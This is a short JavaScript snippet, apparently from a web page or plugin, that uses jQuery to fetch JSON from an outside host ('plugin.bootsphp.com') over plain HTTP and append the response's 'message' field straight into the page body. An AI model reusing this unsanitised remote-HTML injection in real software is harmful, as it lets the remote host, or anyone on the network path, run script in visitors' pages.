$.get('http://plugin.bootsphp.com/popup.js',function(data){
	$('body').append(data.message);
}, 'json');